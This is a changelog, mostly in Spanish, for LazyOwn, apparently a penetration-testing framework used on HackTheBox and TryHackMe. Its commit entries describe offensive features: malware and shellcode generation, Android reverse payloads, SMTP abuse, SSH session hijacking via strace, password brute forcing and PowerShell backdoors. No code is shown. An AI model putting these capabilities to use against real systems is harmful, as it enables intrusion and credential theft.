  *   * feat(malware new): blazor malware \n\n Version: release/0.1.20 \n\n create blazormalware.sh \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 20 03:17:47 2024 -0400 \n\n Hora: 1724138267


### Refactorización

### Otros

  *   * refactor(refactor): se agrega la libreria colors en modules para usar colorines en los modulos \n\n Version: release/0.1.19 \n\n se agrega un script que hace seo a rhost, ademas de un poco de scraping para darnos datos sobre el host \n\n  Modified file(s): - COMMANDS.md - DEPLOY.sh - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/lazyproxy.py\n  Deleted file(s): \n  Created file(s):  \n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 20 02:20:17 2024 -0400 \n\n Hora: 1724134817


### Otros

### Otros

  *   * feature(feat): dos comandos nuevos, skipfish y createdll, nuevo shellcode \n\n Version: release/0.1.19 \n\n nuevos recursos \n\n  Modified file(s): - .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 19 02:20:52 2024 -0400 \n\n Hora: 1724048452


### Nuevas características

### Otros

  *   * feat(feat): create new command shellcode, run lazymsfvenom modified to create shellcode.sh \n\n Version: release/0.1.18 \n\n modify find command to add the one linner to more pleassure \n\n  Modified file(s): - COMMANDS.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - utils.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 19 00:35:53 2024 -0400 \n\n Hora: 1724042153


### Nuevas características

### Otros

  *   * feat(new feat): new funcionality in proxy command, hexdump on screen, capacity to edit responces from client and server :) mitm ? xD now only prints the thata before sent \n\n Version: release/0.1.17 \n\n and alien gray at the banner :P \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - modules/lazyproxy.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 18 21:12:26 2024 -0400 \n\n Hora: 1724029946


### Nuevas características

### Otros

  *   * feat(feat): new prompt \n\n Version: release/0.1.16 \n\n now show the url of the target \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 18 18:46:18 2024 -0400 \n\n Hora: 1724021178


### Nuevas características

### Otros

  *   * feat(feat): new command set_proxychains \n\n Version: release/0.1.15 \n\n documented at COMMANDS.md more info use help set_proxychains \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 18 16:41:31 2024 -0400 \n\n Hora: 1724013691


### Correcciones

### Otros

  *   * fix(bug fixing): bug fixing in vars of DEPLOY.sh \n\n Version: release/0.1.14 \n\n was created readme_file_html to avoid the bug \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 18 16:37:23 2024 -0400 \n\n Hora: 1724013443


### Otros

### Otros

  *   * feature(new payload in msfvenom android): new options in msf rev android \n\n Version: release/0.1.13 \n\n bug fixing in DEPLOY.sh duplicated function \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 17 06:44:52 2024 -0400 \n\n Hora: 1723891492


### Documentación

### Otros

  *   * docs(documented): agradecimientos \n\n Version: release/0.1.12 \n\n a ✌ el creador de sicat \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 17 06:39:12 2024 -0400 \n\n Hora: 1723891152


### Nuevas características

### Otros

  *   * feat(implement sicat libs): to ss command \n\n Version: release/0.1.12 \n\n agradecimientos al creador de sicat tremanda t00l todo el credito a sus autores https://github.com/justakazh/sicat/ \n\n - COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - utils.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 17 02:40:13 2024 -0400 \n\n Hora: 1723876813


### Nuevas características

### Otros

  *   * feat(some fixes): html and new patreon :) \n\n Version: release/0.1.11 \n\n :) \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 16 21:52:15 2024 -0400 \n\n Hora: 1723859535


### Otros

### Otros

  *   * feature(new tools): new commands, new payloads in find, new cves, new machine \n\n Version: release/0.1.10 \n\n from ping to r00t https://www.youtube.com/watch?v=v3XCNM9n534 \n\n - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 16 16:56:04 2024 -0400 \n\n Hora: 1723841764


### Nuevas características

### Otros

  *   * feat(new feature): new command finalrecon docuemnted at COMMANDS.md \n\n Version: release/0.1.9 \n\n new tool file to pwntomate to perform aun automated scann \n\n - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 16 02:57:52 2024 -0400 \n\n Hora: 1723791472


### Nuevas características

### Otros

  *   * feat(command): new commando swaks to abuse of smtp \n\n Version: release/0.1.8 \n\n helper to perfom abuse to smtp server \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 16 02:35:16 2024 -0400 \n\n Hora: 1723790116


### Correcciones

### Otros

  *   * fix(fix in vpn): new machine \n\n Version: release/0.1.7 \n\n chenges in payload.json \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 23:58:16 2024 -0400 \n\n Hora: 1723780696


### Pruebas

### Otros

  *   * test(deleted files): index.sh y dump_readme.sh \n\n Version: release/0.1.6 \n\n se eliminana estos archivos para limpiar un poco de scripts el directorio principal \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - dump_readme.sh - index.sh  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 23:55:59 2024 -0400 \n\n Hora: 1723780559


### Refactorización

### Otros

  *   * refactor(refactor DEPLOY, sessionstrace): se crea todo en un solo archivo deploy y se eliminaran en el proximo commit index.sh ydump_readme.sh \n\n Version: release/0.1.6 \n\n el ataque ahora es capaz de generar una salida en el directorio sessions/strace.txt y muestra una salida bastante legible, mucho mas que la primera poc \n\n - COMMANDS.md - DEPLOY.sh - README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 20:15:03 2024 -0400 \n\n Hora: 1723767303


### Otros

### Otros

  *   * feature(sessionssh y sessionsshstrace): nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.6 \n\n genera un ataque de secuetro de proceso con strace permitiendo observar la session ssh commandos, y salida de los comandos \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 19:06:13 2024 -0400 \n\n Hora: 1723763173


### Pruebas

### Otros

  *   * test(testing Changelog): new method to create changelog \n\n Version: release/0.1.5 \n\n testing this method \n\n - CHANGELOG.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 18:43:06 2024 -0400 \n\n Hora: 1723761786


### Nuevas características

### Otros

  *   * feat(lazyscripts): se crea el comando y el directorio lazyscripts el cual recive como parametro un nombre de chivo \n\n Version: release/0.1.5 \n\n ese archivo debe estar en el direcorio lazyscripts estos archivos cuentan con comandos que seran ejecutados en batch :) \n\n - COMMANDS.md - README.md - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 18:16:02 2024 -0400 \n\n Hora: 1723760162


### Otros

### Otros

  *   * feature(nuevos recursos, comandos, archivos tool para pwntomate): se cargan nuevas herramientas para download_external, nuevos comandos documentados en coomands.md, y nuevos archivos tools para pwntomate \n\n Version: release/0.1.4 \n\n tools, medusa, hydra, ssh, rdp, comandos nuevos portdiscover, portservicesdiscover, y hostdiscover, y una honeypot espectacular, junto a usernanarchy tremenda tool para generar nombres de usuario segun los parametros pasdos \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 05:24:29 2024 -0400 \n\n Hora: 1723713869


### Nuevas características

### Otros

  *   * feat(tool): nuevo tool a pwntomate medusa.tool \n\n Version: release/0.1.3 \n\n automatiza puertos ssh \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - payload.json  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 05:15:06 2024 -0400 \n\n Hora: 1723713306


### Nuevas características

### Otros

  *   * feat(medusa): nueco comando \n\n Version: release/0.1.2 \n\n para crackear servicios ssh \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 04:31:53 2024 -0400 \n\n Hora: 1723710713


### Documentación

### Otros

  *   * docs(changelog): reload \n\n Version: release/0.1.1 \n\n deleted \n\n - CHANGELOG.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 04:30:41 2024 -0400 \n\n Hora: 1723710641


### Documentación

### Otros

  *   * docs(history): reload the history deleted by error holly git :P \n\n Version: release/0.1.1 \n\n  \n\n - CHANGELOG.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:54:04 2024 -0400 \n\n Hora: 1723708444


### Correcciones

### Otros

  *   * fix(fix): fix \n\n Version: release/0.1.1 \n\n fix \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:50:40 2024 -0400 \n\n Hora: 1723708240


### Correcciones

### Otros

  *   * fix(fix): versionamiento \n\n Version:  \n\n  \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:44:46 2024 -0400 \n\n Hora: 1723707886


### Correcciones

### Otros

  *   * fix(fix): fix en los tags \n\n Version:  \n\n  \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:40:26 2024 -0400 \n\n Hora: 1723707626


### Correcciones

### Otros

  *   * fix(version file):  \n\n Version:  \n\n  \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:37:59 2024 -0400 \n\n Hora: 1723707479


### Correcciones

### Otros

  *   * fix(pandoc): command \n\n Version:  \n\n bad arguments \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:36:55 2024 -0400 \n\n Hora: 1723707415


### Correcciones

### Otros

  *   * fix(fix): changelog \n\n Version:  \n\n :D \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:31:11 2024 -0400 \n\n Hora: 1723707071


### Correcciones

### Otros

  *   * fix(fixing): fixin bug in formating of changelog \n\n Version:  \n\n :D \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:26:33 2024 -0400 \n\n Hora: 1723706793


### Correcciones

### Otros

  *   * fix(fixing): fixing semantic version \n\n Version:  \n\n implemented \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:20:20 2024 -0400 \n\n Hora: 1723706420


### Nuevo Release

### Otros

  *   * release(release): tipo release \n\n Version:  \n\n probandoe l tipo release \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:19:32 2024 -0400 \n\n Hora: 1723706372


### Correcciones urgentes

### Otros

  *   * hotfix(error en parametro): deploy en el pandocpara generar documento de changelog \n\n Version: release/0.1.0 \n\n limieza de changelog \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:18:04 2024 -0400 \n\n Hora: 1723706284


### Nuevas características

### Otros

  *   * feat(cambio en el versionamiento semantico): se agregan release y patch \n\n Version:  \n\n al workflow \n\n - DEPLOY.sh - README.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - readmeneitor.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 02:57:20 2024 -0400 \n\n Hora: 1723705040


### Nuevo parche

### Otros

  *   * patch(patching): prueba de nuevos tipos de commits \n\n Version:  \n\n en este caso patch \n\n - DEPLOY.sh - docs/index.html.bak - readmeneitor.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 02:34:57 2024 -0400 \n\n Hora: 1723703697


### Pruebas

### Otros

  *   * test(testind): deploy \n\n Version: release/0.1.0 \n\n test \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 02:31:42 2024 -0400 \n\n Hora: 1723703502


### Nuevas características

### Otros

  *   * feat(semantic versioning): se implementa el versionamiento semantico utilizando el archivo versions.json y git en el archivo DEPLOY.sh \n\n Version: release/0.1.0 \n\n - la version es cargada desde git y depositada en el json, este json se utiliza para mostrar la version en el script \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 02:01:01 2024 -0400 \n\n Hora: 1723701661


### Correcciones

### Otros

  *   * fix(firma de commits con pgp): cree una firmita gpg para firmar los commits \n\n Version: release/0.0.14 \n\n :D \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 01:52:52 2024 -0400 \n\n Hora: 1723701172


### Otros

### Otros

  *   * feature(test): testing deploy feature and semantic versioning \n\n Version: release/0.1.0 \n\n - testing versioning to release/0.0.14 \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 01:50:07 2024 -0400 \n\n Hora: 1723701007


### Pruebas

### Otros

  *   * test(deploy): testing deploy script \n\n Version: release/0.0.13 \n\n testing semantic versioning \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 01:47:24 2024 -0400 \n\n Hora: 1723700844


### Correcciones urgentes

### Otros

  *   * hotfix(bug in Deploy): not updated the index.html file in deploys \n\n Version: release/0.0.14 \n\n - changed scripts index.sh and dump_readme.sh and DEPLOY.sh \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 01:31:04 2024 -0400 \n\n Hora: 1723699864


### Otros

### Otros

  *   * feature(mejoras y fixes): - se agrega un pequeño diccionario en el comando hydra, se mejroa el comando clean, se arreglan algunos bugs \n\n Version: release/0.1.0 \n\n - se agregan colorines al testmeneitor.py para ahcer check visual, mejoras en el comando vpn, en el script fast_run_as_r00t.sh, todo docuemntado en README.md \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 00:13:04 2024 -0400 \n\n Hora: 1723695184


### Nuevas características

### Otros

  *   * feat(add scripts): - adding scripts on sessions/win directory a nc ps1 version \n\n Version: release/0.1.0 \n\n - 2 backdoors in ps1 i found in a machine in tryhackme xD \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 23:31:15 2024 -0400 \n\n Hora: 1723692675


### Documentación

### Otros

  *   * docs(add README.html to anchor tag in menu of index.html): - chenges in index.html in line 162 \n\n Version: release/0.0.13 \n\n added the line in li with anchor tag \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 23:25:51 2024 -0400 \n\n Hora: 1723692351


### Documentación

### Otros

  *   * docs(mejora documentaciòn): se completan varios comandos con descripciones pobres \n\n Version: release/0.0.13 \n\n se mueve el archivo READEME.html que se genera automaticamente a docs/ \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 23:00:31 2024 -0400 \n\n Hora: 1723690831


### Otros

### Otros

  *   * feature(cambios en script fast_run_as_r00t.sh): se agrega la opción --vpn <NUM> para poder elegir parametricamente que vpn se elije para la ejecucion \n\n Version: release/0.1.0 \n\n se agregan metodos de control en el flujo de los comandos como la salida de SIGNAL CONTROL + D \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 18:20:13 2024 -0400 \n\n Hora: 1723674013


### Documentación

### Otros

  *   * docs(test): bad tabs in index.html \n\n Version: release/0.0.13 \n\n  \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 18:06:45 2024 -0400 \n\n Hora: 1723673205


### Documentación

### Otros

  *   * docs(cambio en index.html): tabulacion incorrecta del banner \n\n Version: release/0.0.13 \n\n corregido :D \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 18:01:05 2024 -0400 \n\n Hora: 1723672865


### Refactorización

### Otros

  *   * refactor(refactor): se cambia el nombre de readme.sh a dump_readme.sh para que no moleste cuando se escriba ./run junto al tab \n\n Version: release/0.0.13 \n\n prueba de que todo quede bien \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:45:42 2024 -0400 \n\n Hora: 1723671942


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.0.13 \n\n test \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:38:56 2024 -0400 \n\n Hora: 1723671536


### Otros

### Otros

  *   * feature(actualizador de readme.md): con los nuevos cambios desde los scripts que generan documentaciòn \n\n Version: release/0.1.0 \n\n y prueba de deplsiegue \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:27:23 2024 -0400 \n\n Hora: 1723670843


### Pruebas

### Otros

  *   * test(test): new styles in html of documentation \n\n Version: release/0.0.13 \n\n  \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:06:21 2024 -0400 \n\n Hora: 1723669581


### Pruebas

### Otros

  *   * test(test): testing changelog \n\n Version: release/0.0.13 \n\n  \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:03:41 2024 -0400 \n\n Hora: 1723669421


### Pruebas

### Otros

  *   * test(testing): new changelog format \n\n Version: release/0.0.13 \n\n new template \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:56:07 2024 -0400 \n\n Hora: 1723668967


### Pruebas

### Otros

  *   * test(test):  \n\n Version: release/0.0.13 \n\n test \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:55:32 2024 -0400 \n\n Hora: 1723668932


### Pruebas

### Otros

  *   * test(testeando): nuevo changelog \n\n Version: release/0.0.13 \n\n mejor formateado \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:47:49 2024 -0400 \n\n Hora: 1723668469


### Pruebas

### Otros

  *   * test(test): deploy \n\n Version: release/0.0.13 \n\n changes in changelog \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:35:12 2024 -0400 \n\n Hora: 1723667712


### Pruebas

### Otros

  *   * test(testing): changelog \n\n Version: release/0.0.13 \n\n saltos de linea \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:34:08 2024 -0400 \n\n Hora: 1723667648


### Pruebas

### Otros

  *   * test(tesing): saltos de linea en commit \n\n Version: release/0.0.13 \n\n :) \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:28:47 2024 -0400 \n\n Hora: 1723667327


### Documentación

### Otros

  *   * docs(class="neon-text" on ul): :)\n\nVersion: release/0.0.13\n\n:)\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n\n\nFecha: Wed Aug 14 15:57:39 2024 -0400 - Hora: 1723665459


### Pruebas

### Otros

  *   * test(commits con fecha y hora :P): probando el despliegue\n\nVersion: release/0.0.13\n\ncon fechas\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n\n\nFecha: Wed Aug 14 15:52:12 2024 -0400 - Hora: 1723665132


### Pruebas

### Otros

  *   * test(test de index.html): testeando el despliegue automatizado del sitio web de LazyOwn\n\nVersion: release/0.0.13\n\nhttps://grisuno.github.io/LazyOwn/\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  LazyOwn/   https://grisuno.github.io/LazyOwn/


### Pruebas

### Otros

  *   * test(test index.sh): se realizan cambios en index.sh\n\nVersion: release/0.0.13\n\nestos cambios realizan cambios en index.html con un nuevo sistema de plantillas\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  LazyOwn/   https://grisuno.github.io/LazyOwn/


### Pruebas

### Otros

  *   * test(testing): Testeando el flujo de trabajo en los despliegues automatizados.\n\nVersion: release/0.0.13\n\nrevisando el nuevi versionamiento\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  LazyOwn/   https://grisuno.github.io/LazyOwn/


### Otros

### Otros

  *   * feature(versionamiento semantico en script de deploy): mejora en DEPLOY.sh con versionamiento semantico\n\nVersion: release/0.1.0\n\nNuevo vrsionamiento semantico en el script de depsliegue\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  LazyOwn/   https://grisuno.github.io/LazyOwn/


### Pruebas

### Otros

  *   * test(test of --no-test): and lolcat on clock command :P\n\nclock has now alias\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Documentación

### Otros

  *   * docs(se agrega el change log al readme): tambien se ejecutan pruebas del despliegue con el parametro --no-test\n\ncambios hechos solo en el archivo README.md\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Correcciones urgentes

### Otros

